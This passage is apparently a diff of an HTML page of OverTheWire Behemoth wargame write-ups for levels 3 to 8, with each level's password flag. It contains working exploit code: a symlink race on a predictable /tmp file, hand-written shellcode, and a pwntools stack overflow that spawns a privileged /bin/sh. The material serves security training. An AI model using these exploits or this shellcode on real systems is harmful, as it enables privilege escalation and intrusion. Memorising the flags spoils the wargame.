+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(python3 payload.py;cat) | /behemoth/behemoth3
+</code></pre></div></div>
+
+<p>and then</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/behemoth_pass/behemoth4
+hpjUdlG723
+</code></pre></div></div>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">hpjUdlG723</code></em></strong></p>
+
+        
+        <!-- Level Banner (added for separation between levels) -->
+        <div class="level-banner">Next Level Writeup</div>
+
+        <hr />
+      
+    
+      
+      
+        <h00 id="behemoth05">behemoth05</h00>
+        <p>i created a code in c that creates the file, and then link it to the password.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">pid_t</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"current pid is %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">command</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+    <span class="n">sprintf</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"touch /tmp/%d"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"created /tmp/%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">command_link</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+    <span class="n">sprintf</span><span class="p">(</span><span class="n">command_link</span><span class="p">,</span> <span class="s">"ln -sf /etc/behemoth_pass/behemoth5 /tmp/%d"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="n">command_link</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"linked /tmp/%d to /etc/behemoth_pass/behemoth5</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+
+    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">filename</span> <span class="o">=</span> <span class="s">"/behemoth/behemoth4"</span><span class="p">;</span>
+    <span class="n">execl</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">filename</span> <span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+</code></pre></div></div>
+
+<p><img src="/CTF_writeups/overthewire/behemoth/images/level5.png" alt="alt text" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">mVfC4rBKZ4</code></em></strong></p>
+
+        
+        <!-- Level Banner (added for separation between levels) -->
+        <div class="level-banner">Next Level Writeup</div>
+
+        <hr />
+      
+    
+      
+      
+        <h00 id="behemoth06">behemoth06</h00>
+        <p>in this challenge i wrote simple script that creates UDP socket that tries to listen to localhost:1337</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">'127.0.0.1'</span>  
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>         
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span> 
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Received: </span><span class="si">{</span><span class="n">data</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">break</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"An error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p><img src="/CTF_writeups/overthewire/behemoth/images/level6.png" alt="alt text" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">j9I1wHzfVC</code></em></strong></p>
+
+        
+        <!-- Level Banner (added for separation between levels) -->
+        <div class="level-banner">Next Level Writeup</div>
+
+        <hr />
+      
+    
+      
+      
+        <h00 id="behemoth07">behemoth07</h00>
+        <p>In this challenge, we need to write our own shellcode that will print “HelloKitty”.
+notice that you can’t use ‘0xb’ in the shellcode, which is the length of the string “HelloKitty”, thus, i used ‘0xc’ (it will stop after 11 characters because there is null there)</p>
+
+<p>here the shellcode can be found</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">NOP_SLIDE</span> <span class="o">=</span> <span class="mi">50</span>
+
+<span class="c1"># print = lambda *args, **kwargs: None # override print function
+</span>
+
+<span class="c1"># Shellcode in Python
+# write(1, "HelloKitty", 11)
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
+
+
+    <span class="c1"># mov	ecx,msg		; message to write
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xd2</span><span class="s">"</span>  <span class="c1"># xor edx, edx
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx, which is \0
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x69\x74\x74\x79</span><span class="s">"</span>      <span class="c1"># push "itty"
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x6c\x6c\x6f\x4b</span><span class="s">"</span>      <span class="c1"># push "lloK"
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x0a\x0a\x48\x65</span><span class="s">"</span>      <span class="c1"># push "He"
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x83\xc4\x02</span><span class="s">"</span> <span class="c1">#  add esp, 2 
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe1</span><span class="s">"</span>  <span class="c1"># mov ecx, esp (now ecx contains: "HelloKitty",\x00)
+</span>
+    <span class="c1"># mov	ebx,1		; file descriptor (stdout)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x01</span><span class="s">"</span>  <span class="c1"># push 1
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x5b</span><span class="s">"</span>      <span class="c1"># pop ebx
+</span>
+    <span class="c1"># mov	edx,12		; message length (+1s)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x0c</span><span class="s">"</span>  <span class="c1"># push 11, in this challange i mustn't use '0xb'
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x5a</span><span class="s">"</span>      <span class="c1"># pop edx
+</span>    
+    <span class="c1"># mov	eax,4		; system call number (sys_write)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x04</span><span class="s">"</span>  <span class="c1"># push 4
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax (sys_write)
+</span>    <span class="c1"># int 0x80
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (write(1, "HelloKitty", 11))
+</span>
+    <span class="c1"># mv eax, 1         ; system call number (sys_exit)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x01</span><span class="s">"</span>  <span class="c1"># push 1
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax (sys_exit)
+</span>    <span class="c1"># int 0x80
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (exit())
+</span>
+
+
+<span class="p">)</span>
+
+<span class="c1"># Print shellcode details
+</span><span class="k">print</span><span class="p">(</span><span class="s">"Shellcode code is:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"write(1, </span><span class="se">\"</span><span class="s">HelloKitty</span><span class="se">\"</span><span class="s">, 11)"</span><span class="p">)</span>
+
+<span class="c1"># Print shellcode with NOP slide
+</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Shellcode as formatted string:"</span><span class="p">)</span>
+
+<span class="c1"># Add NOP slide (\x90) before shellcode
+</span><span class="n">nop_slide</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="n">NOP_SLIDE</span>
+<span class="n">formatted_shellcode</span> <span class="o">=</span> <span class="n">nop_slide</span> <span class="o">+</span> <span class="n">shellcode</span>
+
+<span class="c1"># Convert to formatted string
+</span><span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">formatted_shellcode</span><span class="p">))</span>
+
+<span class="c1"># Print shellcode in hex format
+</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Shellcode in hex format:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">formatted_shellcode</span><span class="p">))</span>
+
+<span class="c1"># Calculate shellcode length
+</span><span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">Length of shellcode is </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">formatted_shellcode</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes"</span><span class="p">)</span>
+
+<span class="c1"># sys.stdout.buffer.write(formatted_shellcode)
+</span>
+</code></pre></div></div>
+
+<p><img src="/CTF_writeups/overthewire/behemoth/images/level7.png" alt="alt text" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">sV17oOQTKc</code></em></strong></p>
+
+        
+        <!-- Level Banner (added for separation between levels) -->
+        <div class="level-banner">Next Level Writeup</div>
+
+        <hr />
+      
+    
+      
+      
+        <h00 id="behemoth08">behemoth08</h00>
+        <p>we can see it doesn’t have ASLR and stack protection.
+<img src="/CTF_writeups/overthewire/behemoth/images/level8_1.png" alt="alt text" /></p>
+
+<p>we’ve found using the begin of the script that after 528 bytes we reach the ret-address. however, when trying to enter non alpha characters, it detects us and closing.</p>
+
+<p>if we’ll look closely, we can see that it checks only the 512 first characters, then, it will go to the strcpy without checking. YAY :)
+<img src="/CTF_writeups/overthewire/behemoth/images/level8_2.png" alt="alt text" /></p>
+
+<p>now all left is to find the address of the buffer, play with the debugger to find it. notice it changes based on the length of the input you give it.</p>
+
+<p>here can be found our injection:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">print</span> <span class="o">=</span> <span class="k">lambda</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">:</span> <span class="bp">None</span> <span class="c1"># override print function
+</span>
+
+<span class="c1"># Generate a 528-byte cyclic pattern to identify the return address position (if needed)
+# print(cyclic(1000))  # Generate a 1000-byte cyclic pattern
+</span>
+<span class="c1"># crash_addr = 0x66616168
+# print(cyclic_find(crash_addr))  # Uncomment to find the offset
+# For this case, ret-address is at offset 528
+</span><span class="n">ret_addr_pos</span> <span class="o">=</span> <span class="mi">528</span>
+<span class="n">buffer_address</span> <span class="o">=</span> <span class="mh">0xffffce8c</span>  <span class="c1"># Example buffer address; adjust for your environment
+</span>
+<span class="c1"># Calculate the new return address to point to the shellcode
+</span><span class="n">new_ret_address</span> <span class="o">=</span> <span class="n">buffer_address</span> <span class="o">+</span> <span class="n">ret_addr_pos</span> <span class="o">+</span> <span class="mi">8</span>  <span class="c1"># Shellcode starts right after ret address
+</span>
+<span class="c1"># Initial payload with padding
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">ret_addr_pos</span>  <span class="c1"># Padding to fill the buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">new_ret_address</span><span class="p">)</span>  <span class="c1"># Overwrite return address with the address pointing to the shellcode
+</span>
+<span class="n">NOP_SLIDE</span> <span class="o">=</span> <span class="mi">50</span>  <span class="c1"># Number of NOP instructions before shellcode
+</span>
+<span class="c1"># Shellcode in Python
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x31</span><span class="s">"</span>  <span class="c1"># push 0x31 (geteuid())
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (geteuid())
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xc3</span><span class="s">"</span>  <span class="c1"># mov ebx, eax (uid)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xd9</span><span class="s">"</span>  <span class="c1"># mov ecx, ebx
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x46</span><span class="s">"</span>  <span class="c1"># push 0x46 (setreuid())
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (setreuid(geteuid(), geteuid()))
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xd2</span><span class="s">"</span>  <span class="c1"># xor edx, edx
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx, which is \0
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x2f\x2f\x73\x68</span><span class="s">"</span>  <span class="c1"># push "//sh"
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x2f\x62\x69\x6e</span><span class="s">"</span>  <span class="c1"># push "/bin"
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe3</span><span class="s">"</span>  <span class="c1"># mov ebx, esp (now ebx contains "/bin//sh",\x00)
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx (push NULL into stack)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x53</span><span class="s">"</span>      <span class="c1"># push ebx (push pathname)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe1</span><span class="s">"</span>  <span class="c1"># mov ecx, esp (ecx is argv)
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\xb0\x0b</span><span class="s">"</span>  <span class="c1"># mov al, 0x0b (execve syscall number)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (execve("/bin//sh", argv))
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x01</span><span class="s">"</span>  <span class="c1"># push 1
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax (sys_exit)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (exit())
+</span><span class="p">)</span>
+
+<span class="c1"># Add NOP slide (\x90) before the shellcode for stability
+</span><span class="n">nop_slide</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="n">NOP_SLIDE</span>
+<span class="n">formatted_shellcode</span> <span class="o">=</span> <span class="n">nop_slide</span> <span class="o">+</span> <span class="n">shellcode</span>
+
+<span class="c1"># Append the shellcode to the payload
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">formatted_shellcode</span>
+
+<span class="c1"># Print shellcode details
+</span><span class="k">print</span><span class="p">(</span><span class="s">"Shellcode code is:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"setreuid(geteuid(), geteuid())"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"execv(</span><span class="se">\"</span><span class="s">/bin//sh</span><span class="se">\"</span><span class="s">, argv)"</span><span class="p">)</span>
+
+<span class="c1"># Print shellcode as formatted string
+</span><span class="n">formatted_string</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">formatted_shellcode</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Shellcode as formatted string:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">formatted_string</span><span class="p">)</span>
+
+<span class="c1"># Print shellcode in hex format
+</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Shellcode in hex format:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">" "</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">formatted_shellcode</span><span class="p">))</span>
+
+<span class="c1"># Calculate shellcode length
+</span><span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">Length of shellcode is </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">formatted_shellcode</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes"</span><span class="p">)</span>
+
+<span class="c1"># Print shellcode as formatted string
+</span><span class="n">formatted_string</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Final payload as formatted string:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">formatted_string</span><span class="p">)</span>
+<span class="c1"># Final payload ready to be sent
+</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Final payload in hex:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">" "</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">))</span>
+
+<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p><img src="/CTF_writeups/overthewire/behemoth/images/level8_3.png" alt="alt text" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">8yWcelJd0D</code></em></strong></p>
+
+        
+        <!-- Level Banner (added for separation between levels) -->
+        <div class="level-banner">Next Level Writeup</div>
+
+        <hr />
+      
+    
+      
+      
+    
+  </div>
+
+</div>
+
+      </section>
+    </div>
+  </body>
+</html>
